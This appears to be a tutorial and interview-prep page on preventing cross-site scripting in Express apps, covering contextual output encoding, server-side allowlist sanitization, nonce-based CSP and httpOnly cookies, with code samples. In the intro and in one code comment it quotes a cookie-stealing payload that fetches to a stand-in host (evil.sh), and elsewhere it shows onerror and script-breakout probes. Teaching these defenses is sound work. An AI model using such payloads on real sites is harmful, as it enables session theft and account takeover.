# How Do You Prevent XSS in Express?

## 1. The Real-World Problem — When You Actually Hit This

Your team ships a tiny feature: users can add a short bio to their profile. To keep the line breaks looking nice, someone renders it in the EJS template with `<%- bio %>` instead of `<%= bio %>`. One character of difference. Three weeks later, support tickets start arriving — users say they got logged out, and some saw an "account locked, verify here" banner that nobody built. An attacker had set their own bio to `<script>fetch('https://evil.sh?c='+document.cookie)</script>`. Every visitor who opened that profile ran that script in *their own* browser, with *their own* session cookie attached. The fix was one escaped character; the cleanup was invalidating every session in the database.

This is cross-site scripting (XSS): your server hands the browser a document, and user-supplied bytes end up inside it as *instructions* instead of *text*. The scary part is how ordinary the bug looks — a template literal, a missing `%`, a `dangerouslySetInnerHTML` someone copied from a blog post. And the interview question "how do you prevent XSS?" punishes one-layer answers. "React escapes it anyway" dies instantly under "your app also has a server-rendered invoice email and an admin dashboard showing user bios — still true?" The real answer is a stack of four defenses, each doing a different job, and this page is about knowing exactly what each job is.

## 2. The Analogy — Make the Mechanic Obvious

Think of electricity.

A wall socket doesn't judge what gets plugged into it. If the thing arriving carries current-shaped signals, the circuit treats them as power and lets them run. Your browser is exactly that kind of socket for HTML: anything in the page that is shaped like markup — a `<script>` tag, an `onerror=` handler, a `javascript:` URL — gets executed, no questions asked. The browser is not being naive; running markup is its job. XSS happens when data sneaks onto the wires wearing a markup costume.

Now the four defenses become physical things:

- **Output encoding is the transformer at each outlet.** Before raw generator power reaches any socket, it gets converted into the exact form that socket expects. Crucially, there is more than one socket type: an element-content slot, an attribute slot, an inline-script slot, a URL slot — and each speaks a different dialect. Power conditioned for one outlet can still be lethal in another.
- **Sanitization is appliance certification.** Sometimes you genuinely want an appliance — rich text with bold and links — plugged into the grid. So instead of converting it to inert form, an inspector checks it against a list of approved appliance types and rejects everything else. You're allowing *some* live equipment through, on purpose, under strict inspection.
- **CSP is the breaker panel.** Even if someone splices a rogue wire directly into your wall, the breaker refuses to energize any circuit that doesn't carry the day's signed seal. Insulation failed? The breaker still keeps the rogue wire dead.
- **httpOnly cookies are the sealed utility vault.** If an intruder does get inside the house, they can flip every switch — turn lights on and off, act like a resident while they're standing there. But the main feed is locked in a vault they can't open, so they can't detach it and carry it home to power their own house forever.

Keep these four pictures separate — transformer, inspector, breaker, vault — because the most common production mistake is trusting one of them to do another's job.

## 3. The Full Explanation — How It Actually Works

Start with what the browser actually does. Your Express route builds a string — HTML, JSON, an email template — and sends it. The browser parses that string and sorts every byte into two worlds: **display text**, which is inert, and **markup**, which is executable. There is no third world. XSS is simply user data ending up on the executable side. Nothing was "hacked"; the browser faithfully ran the document your server shipped. That reframing matters: prevention isn't about stopping attackers from sending weird strings — you can't — it's about guaranteeing that their bytes stay in the display-text world everywhere they exit your app.

**Output encoding** is the primary guarantee, and the name tells you the timing: it happens on *output*, at the last moment before a value is spliced into a response. Encoding rewrites dangerous characters into inert representations — `<` becomes `&lt;`, `"` becomes `&quot;` — so the browser renders the characters as visible text and nothing more. The value still displays correctly ("if a<b then..." reads fine); it just can never come alive.

Why output and not input? Because the same stored value usually exits through several different holes, and each hole needs a *different* encoding. A username goes into an HTML element on the profile page, into a `value="..."` attribute in a form, into a JavaScript string in an analytics snippet, and into a URL in a notification link. Four exits, four dialects. If you "clean" the data once at input and store the cleaned version, you've guessed one context and broken the other three — plus you've permanently mangled legitimate values like `O'Brien` or `<3`. Encode at the exit, in the dialect that exit requires, and the stored data stays raw and honest.

And this is the sharpest distinction on the whole page — **encoding versus sanitization**. Encoding assumes the value is pure data and makes it impossible to execute. Sanitization assumes the value *is supposed to contain live HTML* — a rich-text article body — and its job is to parse that HTML and keep only what's on an allowlist of tags, attributes, and URL schemes. Encoding is the default for every plain-text field you have: names, comments without formatting, search terms, addresses. Sanitization is the exception you reach for only when the product genuinely needs markup to survive, and it's strictly riskier, because you are deliberately letting some real HTML through. Two hard rules for sanitization: allowlist, never blocklist (naming what's forbidden loses against the infinite creativity of payloads), and do it on the **server** before storing, because client-side sanitization is trivially bypassed by anyone calling your API directly with curl.

So where exactly do server-rendered strings go dangerous? Everywhere a template drops a value without escaping for its context:

- In EJS, `<%= value %>` encodes; `<%- value %>` is raw and trusts the value completely. Pug's `=` encodes while `!=` is raw. Handlebars `{{value}}` encodes; the triple-stash `{{{value}}}` is raw. The dangerous variant always exists because of sanitization-style use cases — and it's one keystroke away from every plain-text field.
- Attribute slots bite differently. Even a correctly encoded value inside an *unquoted* attribute is exploitable, because a plain space in the value starts a brand-new attribute: `<img alt=<%-= alt %> src=...>` with `alt` set to `x onerror=alert(1)` — the encoder didn't touch spaces, and now there's an event handler. Quote every attribute, always.
- Inline `<script>` slots are the sneakiest. `JSON.stringify(userInput)` feels safe, but a value containing `</script><script>alert(1)</script>` closes your script tag early and opens its own, because the HTML parser sees `</script>` long before any JavaScript runs. The fix is to also break up every `<` after stringify.
- URLs are their own context. Percent-encoding makes a value stay *inside* a URL, but it does nothing about the scheme: a user-submitted link of `javascript:fetch(...)` percent-encodes beautifully and executes perfectly. Validate the scheme against `http:`/`https:` before you ever render a user-controlled href.

**CSP** — Content-Security-Policy — is the backstop layer. It's an HTTP response header telling the browser which sources scripts may load from and whether inline scripts may run at all. With `script-src 'self'`, an injected `<script>alert(1)</script>` simply never executes: the browser refuses inline scripts and any script from off-site origins. That's why it's a backstop and not the primary defense: it assumes something already leaked into your HTML and makes the leak inert. When you legitimately need an inline script, don't reopen the hole with `'unsafe-inline'` (that whitelists *every* inline script, including injected ones — it switches the breaker off entirely); issue a fresh random **nonce** per request and stamp it on both the header and your legitimate `<script nonce="...">`. And roll it out with the `Content-Security-Policy-Report-Only` header first, which reports violations without blocking, so you discover what your frontend actually depends on before you enforce.

**httpOnly cookies** are the blast-radius control. Here's the honest assumption behind them: across a large frontend, dozens of npm dependencies, and years of feature churn, you cannot promise zero XSS forever. Supply-chain attacks have shipped malicious code through popular packages. So you plan for the day a script runs anyway, and you shrink what it can steal. With `httpOnly: true`, the session cookie is sent by the browser on every request but is invisible to `document.cookie` — the injected script can *act* as the user while the tab is open (call APIs, change settings — that's the CSRF-family problem, handled over in the CSRF page), but it cannot lift the token out of the browser and replay it tomorrow from anywhere on earth. The vault stays shut; the intruder is stuck inside one room, in one visit.

Stacked together, the order of operations for an Express app is: validate input for business correctness, encode every output by default, sanitize only deliberate rich-text fields, put a nonce-based CSP under all of it, and keep session tokens in httpOnly cookies so even a successful injection is a contained incident instead of a mass credential leak.

## 4. See It In Practice — Real Code or Queries

Environment assumptions for everything below: Node 18+, Express 4, `helmet` and `sanitize-html` installed. Express 4 does not forward rejected promises from async handlers to your error middleware, so handlers that await get wrapped — the mechanics of that wrapper live in [how-do-you-handle-async-errors-in-express](how-do-you-handle-async-errors-in-express.md), and the error-handler arity rules in [what-is-error-handling-middleware](what-is-error-handling-middleware.md). (Express 5 forwards rejections automatically; the wrapper is harmless either way.)

First, the bug itself and the smallest fix — element-content encoding:

```js
const express = require("express");

const app = express();

// DANGEROUS: the query value becomes part of the HTML itself.
// GET /greet?name=<script>fetch('//evil.sh?c='+document.cookie)</script>
// ships a page that really contains that script tag. Reflected XSS.
app.get("/greet", (req, res) => {
  res.send(`<h1>Hello ${req.query.name ?? ""}</h1>`);
});

// SAFE: convert the value to inert display text before it enters the page.
// Ampersand must go first so we never double-encode our own entities.
function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

app.get("/greet-safe", (req, res) => {
  const name = escapeHtml(req.query.name ?? "stranger");
  // Now the attack URL renders as literal text on screen. Harmless.
  res.send(`<h1>Hello ${name}</h1>`);
});

app.listen(3000);
```

Next, the part most candidates miss: the *same* value needs different encodings for different exits, and a lookup table used for security decisions must **fail closed** — an unknown context gets the strictest treatment, never none.

```js
function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

// One stored value, four exit points, four dialects.
// Unknown context -> full HTML escaping. Fail closed, never open.
const ENCODERS = {
  // Between tags: the standard five entities cover it.
  html: escapeHtml,

  // Inside a QUOTED attribute: quotes are the escape hatch, so they die
  // along with angle brackets. (An unquoted attribute would still be
  // exploitable via spaces - so quote your attributes at the template.)
  attr: escapeHtml,

  // Inside an inline <script>: JSON.stringify makes the value a proper
  // JS string literal, but "</script>" would still close the tag early,
  // so break up every remaining "<".
  js: (value) => JSON.stringify(String(value)).replaceAll("<", "\\u003c"),

  // URL slot: reject schemes that can execute, then keep the value
  // inside one URL. javascript: payloads get dropped entirely.
  url: (value) => {
    const s = String(value);
    return /^https?:\/\//i.test(s) ? encodeURI(s) : "";
  },
};

function encodeFor(context, value) {
  const encoder = ENCODERS[context];
  return encoder ? encoder(value) : escapeHtml(value);
}
```

Then the rich-text exception — sanitization with an allowlist, done server-side, with the async handler properly wrapped:

```js
const express = require("express");
const sanitizeHtml = require("sanitize-html");

const app = express();
app.use(express.json());

// Express 4: rejected promises from async handlers vanish silently,
// hanging the request. Wrap every awaiting handler.
const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

// Allowlist, not blocklist: we NAME the few tags we accept and strip
// everything else - <script>, <iframe>, every on* event handler.
// allowedSchemes kills javascript: hrefs inside otherwise-legal <a> tags.
function cleanBio(dirty) {
  return sanitizeHtml(dirty, {
    allowedTags: ["p", "strong", "em", "a", "br"],
    allowedAttributes: { a: ["href", "title"] },
    allowedSchemes: ["http", "https"],
  });
}

app.post(
  "/profile",
  asyncHandler(async (req, res) => {
    const bio = cleanBio(req.body.bio);
    await saveBio(req.user.id, bio); // persistence happens here
    res.status(201).json({ bio });
  })
);

async function saveBio(userId, bio) {
  // pretend db call - exists so the wrapped handler above is honest
  return { userId, bio };
}

app.listen(3000);
```

Finally, CSP as the breaker panel and httpOnly as the vault, wired into one app with Helmet ([more on Helmet itself here](what-is-helmet.md)):

```js
const crypto = require("crypto");
const express = require("express");
const helmet = require("helmet");

const app = express();

// Fresh nonce per request. Must run BEFORE helmet so the CSP
// serializer below can read it.
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString("hex");
  next();
});

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        // Only scripts carrying THIS request's nonce may run inline.
        // An injected <script> has no nonce and stays dead.
        scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`],
      },
    },
  })
);

app.get("/", (req, res) => {
  // The vault: the browser sends this cookie automatically, but
  // document.cookie cannot read it - an XSS payload cannot exfiltrate
  // the session token. (Cookie flags in depth: see the cookies page.)
  res.cookie("sid", "demo-session-token", {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
  });

  const legitInlineScript = "console.log('only I am allowed to run')";
  res.send(`
    <h1>Dashboard</h1>
    <script nonce="${res.locals.cspNonce}">${legitInlineScript}</script>
  `);
});

app.listen(3000);
```

Attack that page with `/` visited through a proxy injecting `<script>alert(1)</script>` and nothing happens: no nonce, breaker doesn't trip, script never runs. And if a zero-nonce script ever *did* run through some other hole, it finds no readable `sid` cookie to steal.

## 5. Interview Questions — All of Them, Done Properly

**Q: What is XSS and how do you prevent it in Express?**

XSS is an injection attack where user-controlled data ends up in a response in a way the victim's browser executes as code. The browser sorts page content into display text versus executable markup, and injection is data crossing that line. Prevention in Express is layered, because each layer answers a different failure. First, contextual output encoding: every template interpolation of user data goes through escaping matched to its destination context — element content, quoted attribute, inline script, or URL — which is what EJS `<%= %>` gives you and `<%- %>` throws away. Second, allowlist sanitization with something like `sanitize-html`, but only for fields that are genuinely supposed to hold rich HTML, done server-side before storage. Third, a Content-Security-Policy via Helmet with per-request nonces instead of `'unsafe-inline'`, so an injection that slips through every encoding mistake still can't execute. Fourth, damage control: session cookies flagged httpOnly, Secure, and SameSite, so even a successful script can act as the user inside the page but can't steal the token for later reuse. Input validation helps correctness too, but nobody should claim it prevents XSS — the guarantee comes from what you do at output.

**Q: What are the types of XSS, and does the backend defend against each one?**

Stored XSS lands in your database — a comment, a bio — and fires for every user who views the page containing it. Most damaging, purely a backend responsibility: encode on render, sanitize rich fields on write. Reflected XSS travels in the request itself — typically a crafted URL whose query parameter gets echoed into the response — and needs the victim to click a poisoned link. Same backend fixes apply: never interpolate query params into responses unencoded. DOM-based XSS never touches your server at all: client-side JavaScript reads something attacker-controlled — `location.hash`, `postMessage`, a URL fragment — and passes it to a dangerous sink like `innerHTML` or `eval`. Your Express logs will show nothing, because the payload may never even be sent to you. The backend still contributes two defenses: a strict CSP blocks the inline execution those sinks usually rely on, and reviewing frontend code for sinks is a shared engineering duty. But the direct fix for DOM-based XSS lives in the frontend codebase — which is exactly why CSP-as-backstop belongs on the backend's checklist anyway.

**Q: What's the difference between output encoding and sanitization? When do you use each?**

Encoding treats the value as pure data and rewrites metacharacters into inert forms so execution is impossible — use it as the default for every plain-text field, chosen per output context. Sanitization treats the value as intended-to-be-live HTML, parses it, and keeps only allowlisted tags, attributes, and URL schemes — use it only for deliberately rich fields like article bodies. The one-line rule: encode when the user gave you words, sanitize when the user gave you markup. They also fail differently: a forgotten encoding is usually a total compromise, while weak sanitization narrows the attack to whatever slipped past the allowlist — which is why sanitizers must be allowlist-based, maintained libraries rather than homemade regexes.

**Q: Why encode at output instead of cleaning input before storing?**

Because one stored value exits through many contexts, each demanding different encoding, and no single "clean" form satisfies all of them. `O'Brien` is fine in element content, needs quote handling in attributes, needs different escaping again inside an inline script. Pre-escaping at input also corrupts legitimate data permanently — search for `&amp;` and you'll find users literally typed it — and it creates double-escaping bugs when a value passes through two encoded renders. Input validation remains worthwhile, but for schema and business correctness (email looks like an email, age is a number), not for XSS. The invariant is: store raw, encode at the last moment before each exit.

**Q: How does CSP actually stop a script that's already in the page?**

CSP is enforced by the browser, not the server: the server declares a policy in a response header, and the browser refuses to load or execute resources that violate it. With `script-src 'self'`, inline `<script>` blocks and off-origin script URLs won't run — the injected tag sits in the DOM, inert. Legitimate inline scripts get a fresh random nonce per request, echoed in both the header directive and the script tag; the browser only runs inline scripts whose nonce matches this request's. Two practical points seniors mention: `'unsafe-inline'` nullifies the whole protection because it allows every inline script, and `Report-Only` mode lets you log violations in production for weeks before enforcing, so the policy doesn't take down the marketing team's tracking snippet on day one.

**Q: Do httpOnly cookies prevent XSS?**

No — precise phrasing matters in interviews. httpOnly limits XSS *damage*, not XSS *occurrence*. The script still runs; it can still read the DOM, call your APIs as the logged-in user, and change account settings during that visit. What it cannot do is read the session cookie via `document.cookie`, so it can't exfiltrate the token and reuse it after the victim closes the tab, from another network, on another account. That converts a catastrophic, persistent credential theft into a bounded, per-visit abuse window. Pair it with Secure and SameSite, and handle the remaining in-page abuse surface with CSRF defenses — that's a separate problem with its own page.

**Q: We use React, so XSS isn't our problem, right?**

React escapes interpolated JSX by default, which genuinely removes the most common class of bugs — and then provides explicit escape hatches that reopen it. `dangerouslySetInnerHTML` exists precisely to inject raw HTML; feed it user content unsanitized and you have stored XSS. Framework-blind holes remain too: `href={userProvidedUrl}` happily renders `javascript:...` links, server-side rendering templates have the same raw-interpolation footguns as any EJS app, and hydration mismatches can smuggle content. Add supply-chain risk — a compromised npm package runs arbitrary code in every visitor's browser — and the honest position is: frameworks raise the floor, not the ceiling. Backend encoding discipline, sanitization for rich fields, and CSP stay mandatory.

**Q: How would you verify an Express app's XSS defenses?**

Unit tests around the rendering helpers asserting exact escaped outputs — including nasty inputs like `"><img src=x onerror=alert(1)>` and `</script>` — so a template refactor can't silently swap `<%=` for `<%-`. Integration tests posting rich text through the API and asserting the stored version contains only allowlisted tags. A staged CSP rollout: Report-Only first, watch violation reports for unexpected sources, then enforce. Dependency scanning in CI for the supply-chain path. And manual spot checks with a proxy rewriting responses to include probe payloads, confirming the browser blocks them — testing the whole stack, not just your functions.

## 6. The Traps — What Goes Wrong in Production

**Raw interpolation "just this once."** Someone needs a line break preserved and flips `<%= %>` to `<%- %>` in EJS (or `{{ }}` to `{{{ }}}` in Handlebars). That one field is now a stored-XSS injection point for every viewer of the page. The fix isn't vigilance — it's making raw interpolation rare enough to review: reserve raw slots for build-time constants and sanitizer output, and grep CI for raw-interpolation patterns receiving anything request-derived.

**Storing pre-encoded HTML.** A dev escapes bios at input "so they're safe," stores `&lt;script&gt;...` in the column. Now rendering with encoding shows literal `&lt;` junk to users (double-escaping), and worse, the team learns to skip output encoding "because it's already clean" — which breaks the moment the same value is reused in a context the original encoding didn't target, like an attribute or inline script. Store raw, encode at exit. Every time.

**Blocklist sanitization and regex stripping.** Stripping `<script>` loses to `<scr<script>ipt>`, `<SCRIPT >`, `<img src=x onerror=...>`, and a hundred relatives, because you're playing whack-a-mole with an attacker who moves last. Allowlisting wins structurally: name the handful of tags and attributes you accept, drop everything else, and let a maintained library (`sanitize-html`) own the parser edge cases — hand-written HTML parsers are their own CVE generator.

**`unsafe-inline` in the CSP.** The header exists, the checkbox is checked, and protection is zero: `script-src 'self' 'unsafe-inline'` permits every inline script including injected ones. Teams do this because a legacy analytics snippet needed inline execution. The correct move is nonces for the few legitimate inline scripts, or moving them into bundled files.

**Client-side-only sanitization.** DOMPurify in the React editor feels like the job done, until an attacker POSTs the payload straight to `/api/profile` with curl and the stored value renders raw everywhere. Client sanitization is UX polish; the server-side sanitize-before-store step is the actual security boundary.

**Unquoted template attributes.** `<td title=<%= label %>>` is broken even though the value was attribute-encoded, because a space in the value terminates the attribute and starts `onerror=`. Encoding handles characters; quoting handles boundaries. Both, always: `title="<%= label %>"`.

**Trusting `JSON.stringify` alone in inline scripts.** `var config = <%= JSON.stringify(userConfig) %>;` dies to a config value containing `</script><script>steal()</script>` — the HTML parser ends the script block at the closing tag regardless of your JavaScript-level string semantics. Append the `<` breakup (`replaceAll("<", "\\u003c")`) or serve config from a fetched JSON endpoint instead.

**"We have httpOnly, we're covered."** The vault protects the token, not the user. With a live injected script the attacker can transfer funds, change the recovery email, and delete data — acting as the victim in real time. httpOnly shrinks the blast radius; it doesn't eliminate the blast. That's precisely why it's layer four and not the whole strategy.

## 7. Compare With Related Concepts

**XSS vs CSRF.** XSS executes attacker code *as* the user inside your page; CSRF tricks the browser into sending requests the user never intended, without any code running. They interlock uncomfortably: an XSS hole often defeats CSRF protections, because injected script can read CSRF tokens out of the DOM and fire properly-forged requests. Defense split: output encoding and CSP fight XSS; SameSite cookies and CSRF tokens fight CSRF; httpOnly blunts the theft payoff of XSS specifically. Deep dive on the second half: [how-do-you-prevent-csrf](../security/how-do-you-prevent-csrf.md).

**Output encoding vs input validation.** Validation decides whether data is *acceptable* — type, shape, range, business rules — and rejects what isn't; encoding accepts everything and guarantees data *stays inert* wherever it's displayed. Validation lives at the boundary on the way in ([the mechanics here](how-do-you-validate-request-body.md)); encoding lives at the template on the way out. Rejecting bad emails is validation's job; surviving `<script>` in a nickname is encoding's. You need both, and neither substitutes for the other.

**Sanitization vs encoding.** Both transform untrusted data, but they disagree about intent: encoding says "this is text, make it unable to execute," sanitization says "this is markup, keep only the parts we allow to execute." Choose encoding for every plain-text field by default; choose sanitization only where the product contract promises rich formatting.

**XSS vs SQL injection.** Same family — data interpreted as code — aimed at different interpreters across different trust boundaries. SQL injection targets your database engine, fought with parameterized queries; XSS targets the victim's browser, fought with output encoding. The senior-flavored point: in both cases the interpreter cannot be taught to distrust input, so the defense always lives in how *you* hand data to the interpreter, never in hoping payloads stay polite. Sibling coverage: [what-is-xss](../security/what-is-xss.md), [what-is-output-encoding](../security/what-is-output-encoding.md), [what-is-csp](../security/what-is-csp.md).

## 8. 🧠 The Memory Hook

User data is live power arriving from an untrusted generator, and the browser is a socket that runs anything shaped like markup. Condition it at every outlet in the dialect that outlet speaks (encode per context), certify the few appliances you truly want inside (allowlist sanitization), keep the breaker armed so rogue wires stay dead (nonce-based CSP), and lock the main feed in the vault so even a break-in can't carry your session home (httpOnly).
